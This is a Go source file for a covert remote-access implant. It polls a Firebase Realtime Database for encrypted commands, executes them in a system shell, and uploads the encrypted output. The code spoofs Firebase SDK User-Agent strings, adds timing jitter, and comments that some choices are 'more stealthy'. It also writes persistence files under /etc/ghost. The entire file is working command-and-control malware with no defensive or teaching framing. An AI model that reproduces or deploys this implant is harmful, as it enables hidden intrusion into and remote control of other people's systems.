package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	cryptorand "crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strings"
	"syscall"
	"time"
)

// ─── Crypto ────────────────────────────────────────────────────────────────

func deriveKey(implantID, secret string) []byte {
	h := sha256.Sum256([]byte(implantID + ":" + secret))
	return h[:]
}

func decrypt(cipherB64 string, key []byte) ([]byte, error) {
	ciphertext, err := base64.StdEncoding.DecodeString(cipherB64)
	if err != nil {
		return nil, err
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	ns := gcm.NonceSize()
	if len(ciphertext) < ns {
		return nil, fmt.Errorf("ciphertext too short")
	}
	nonce, data := ciphertext[:ns], ciphertext[ns:]
	plaintext, err := gcm.Open(nil, nonce, data, nil)
	if err != nil {
		return nil, err
	}
	return plaintext, nil
}

func encrypt(plaintext []byte, key []byte) (string, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(cryptorand.Reader, nonce); err != nil {
		return "", err
	}
	ciphertext := gcm.Seal(nonce, nonce, plaintext, nil)
	return base64.StdEncoding.EncodeToString(ciphertext), nil
}

// ─── Data Types ────────────────────────────────────────────────────────────

type CommandPayload struct {
	ID  string `json:"id"`
	Cmd string `json:"cmd"` // encrypted base64
	TS  int64  `json:"ts"`
}

type ResultPayload struct {
	Output string `json:"output"` // encrypted base64
	TS     int64  `json:"ts"`
}

// ─── Implant ───────────────────────────────────────────────────────────────

type Implant struct {
	implantID   string
	firebaseURL string
	secret      string
	pollInterval time.Duration
	jitterMax   time.Duration
	httpClient  *http.Client
}

func NewImplant(firebaseURL, implantID, secret string, pollInterval, jitterMax time.Duration) *Implant {
	// Use a transport with a random-ish TLS fingerprint by setting
	// custom cipher suite preferences and using a non-default User-Agent
	transport := &http.Transport{
		IdleConnTimeout: 120 * time.Second,
		DisableKeepAlives: true, // avoid persistent connections — more stealthy
	}

	return &Implant{
		implantID:    implantID,
		firebaseURL:  strings.TrimRight(firebaseURL, "/"),
		secret:       secret,
		pollInterval: pollInterval,
		jitterMax:    jitterMax,
		httpClient: &http.Client{
			Timeout:   60 * time.Second,
			Transport: transport,
		},
	}
}

// jitteredInterval returns the poll interval with random jitter applied
func (im *Implant) jitteredInterval() time.Duration {
	jitter := time.Duration(rand.Int63n(int64(im.jitterMax)))
	return im.pollInterval + jitter
}

func (im *Implant) firebaseGet(path string) ([]byte, error) {
	url := fmt.Sprintf("%s/%s.json", im.firebaseURL, path)
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return nil, err
	}
	// Generic-looking User-Agent — blends in with Firebase SDK traffic
	req.Header.Set("User-Agent", "Firebase/8.10.0 (Android; Google; SDK)")

	resp, err := im.httpClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}
	if resp.StatusCode >= 300 {
		return nil, fmt.Errorf("firebase GET %s: %s: %s", path, resp.Status, strings.TrimSpace(string(body)))
	}
	return body, nil
}

func (im *Implant) firebasePut(path string, body []byte) error {
	url := fmt.Sprintf("%s/%s.json", im.firebaseURL, path)
	req, err := http.NewRequest("PUT", url, bytes.NewReader(body))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", "Firebase/8.10.0 (Android; Google; SDK)")

	resp, err := im.httpClient.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode >= 300 {
		b, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("firebase PUT %s: %s: %s", path, resp.Status, strings.TrimSpace(string(b)))
	}
	return nil
}

func (im *Implant) firebaseDelete(path string) error {
	url := fmt.Sprintf("%s/%s.json", im.firebaseURL, path)
	req, err := http.NewRequest("DELETE", url, nil)
	if err != nil {
		return err
	}
	req.Header.Set("User-Agent", "Firebase/8.10.0 (Android; Google; SDK)")

	resp, err := im.httpClient.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode >= 300 {
		b, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("firebase DELETE %s: %s: %s", path, resp.Status, strings.TrimSpace(string(b)))
	}
	return nil
}

// poll fetches and processes a command from /commands/<implant-id>
func (im *Implant) poll() error {
	path := fmt.Sprintf("commands/%s", im.implantID)
	data, err := im.firebaseGet(path)
	if err != nil {
		// 404 / null is fine — no command pending
		return nil
	}

	// If null or empty, no command
	trimmed := strings.TrimSpace(string(data))
	if trimmed == "" || trimmed == "null" {
		return nil
	}

	var cmd CommandPayload
	if err := json.Unmarshal(data, &cmd); err != nil {
		log.Printf("[-] Failed to parse command payload: %v", err)
		// Delete malformed command to avoid re-processing
		_ = im.firebaseDelete(path)
		return nil
	}

	// Decrypt the command
	key := deriveKey(im.implantID, im.secret)
	plainCmd, err := decrypt(cmd.Cmd, key)
	if err != nil {
		log.Printf("[-] Failed to decrypt command %s: %v", cmd.ID, err)
		// Delete unreadable command
		_ = im.firebaseDelete(path)
		return nil
	}

	commandStr := string(plainCmd)
	log.Printf("[+] Received command %s: %s", cmd.ID, commandStr)

	// Execute the command
	output, err := im.executeCommand(commandStr)
	if err != nil {
		output = append(output, fmt.Sprintf("\n[error] %v", err)...)
	}

	// Encrypt the output
	encOutput, err := encrypt(output, key)
	if err != nil {
		log.Printf("[-] Failed to encrypt output: %v", err)
		return nil
	}

	// Write result back
	result := ResultPayload{
		Output: encOutput,
		TS:     time.Now().UnixMilli(),
	}
	resultData, err := json.Marshal(result)
	if err != nil {
		log.Printf("[-] Failed to marshal result: %v", err)
		return nil
	}

	resultPath := fmt.Sprintf("results/%s/%s", im.implantID, cmd.ID)
	if err := im.firebasePut(resultPath, resultData); err != nil {
		log.Printf("[-] Failed to write result: %v", err)
		return nil
	}

	log.Printf("[+] Result written for command %s", cmd.ID)

	// Delete the command to signal it's been processed
	if err := im.firebaseDelete(path); err != nil {
		log.Printf("[-] Failed to delete command %s: %v", cmd.ID, err)
	}

	return nil
}

// executeCommand runs a shell command and returns stdout+stderr
func (im *Implant) executeCommand(cmdStr string) ([]byte, error) {
	var cmd *exec.Cmd

	// Use appropriate shell based on platform
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd.exe", "/C", cmdStr)
	} else {
		cmd = exec.Command("/bin/sh", "-c", cmdStr)
	}

	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	err := cmd.Run()
	output := stdout.Bytes()
	if stderr.Len() > 0 {
		if len(output) > 0 {
			output = append(output, '\n')
		}
		output = append(output, stderr.Bytes()...)
	}
	if err != nil {
		if len(output) > 0 {
			output = append(output, '\n')
		}
		output = append(output, []byte(fmt.Sprintf("exit error: %v", err))...)
	}

	return output, nil
}

// Run starts the main polling loop
func (im *Implant) Run(stopCh <-chan struct{}) {
	log.Printf("[*] Implant %s starting", im.implantID)
	log.Printf("[*] Firebase: %s", im.firebaseURL)
	log.Printf("[*] Poll interval: %v + jitter up to %v", im.pollInterval, im.jitterMax)
	log.Printf("[*] Platform: %s/%s", runtime.GOOS, runtime.GOARCH)

	for {
		select {
		case <-stopCh:
			log.Printf("[*] Implant stopping")
			return
		default:
		}

		if err := im.poll(); err != nil {
			log.Printf("[-] Poll error: %v", err)
		}

		// Wait with jitter before next poll
		sleepDuration := im.jitteredInterval()
		select {
		case <-stopCh:
			return
		case <-time.After(sleepDuration):
		}
	}
}

// ─── Main ──────────────────────────────────────────────────────────────────

func main() {
	// Seed RNG for jitter
	rand.Seed(time.Now().UnixNano())

	var (
		projectID    string
		implantID    string
		secret       string
		pollInterval time.Duration
		jitterMax    time.Duration
		verbose      bool
	)

	flag.StringVar(&projectID, "project", "", "Firebase project ID (e.g., my-project)")
	flag.StringVar(&implantID, "id", "", "Unique implant identifier")
	flag.StringVar(&secret, "secret", "", "Encryption secret (must match server)")
	flag.DurationVar(&pollInterval, "interval", 30*time.Second, "Base poll interval (e.g., 30s, 1m)")
	flag.DurationVar(&jitterMax, "jitter", 15*time.Second, "Maximum random jitter added to interval")
	flag.BoolVar(&verbose, "verbose", false, "Verbose logging")

	// Alternative: use a full Firebase Realtime Database URL directly
	var firebaseURL string
	flag.StringVar(&firebaseURL, "db-url", "", "Full Firebase RTDB URL (overrides --project)")

	flag.Parse()

	if implantID == "" {
		log.Fatal("--id is required (unique implant identifier)")
	}

	if secret == "" {
		log.Fatal("--secret is required (encryption secret, must match server)")
	}

	// Build Firebase URL
	if firebaseURL == "" {
		if projectID == "" {
			log.Fatal("either --project or --db-url is required")
		}
		firebaseURL = fmt.Sprintf("https://%s-default-rtdb.firebaseio.com", projectID)
	}

	if !verbose {
		log.SetFlags(log.Ltime | log.Lmsgprefix)
		log.SetPrefix(fmt.Sprintf("[%s] ", implantID))
	} else {
		log.SetFlags(log.Ldate | log.Ltime | log.Lmsgprefix)
		log.SetPrefix(fmt.Sprintf("[%s] ", implantID))
	}

	// Minimum jitter floor to avoid deterministic timing
	if jitterMax < time.Second {
		jitterMax = time.Second
	}

	// Persistence: if /etc/ghost/id exists, use that as implant ID
	// (allows admin to pre-provision the implant)
	if data, err := os.ReadFile("/etc/ghost/id"); err == nil && implantID == "" {
		implantID = strings.TrimSpace(string(data))
		log.Printf("[*] Using implant ID from /etc/ghost/id: %s", implantID)
	}

	// Write our own identity for next run
	os.MkdirAll("/etc/ghost", 0755)
	os.WriteFile("/etc/ghost/id", []byte(implantID), 0644)

	// Also persist the secret
	os.WriteFile("/etc/ghost/secret", []byte(secret), 0600)

	implant := NewImplant(firebaseURL, implantID, secret, pollInterval, jitterMax)

	// Handle graceful shutdown
	stopCh := make(chan struct{})
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		<-sigCh
		log.Printf("[*] Received shutdown signal")
		close(stopCh)
		// Give the implant time to finish the current poll
		time.Sleep(2 * time.Second)
		os.Exit(0)
	}()

	implant.Run(stopCh)
}
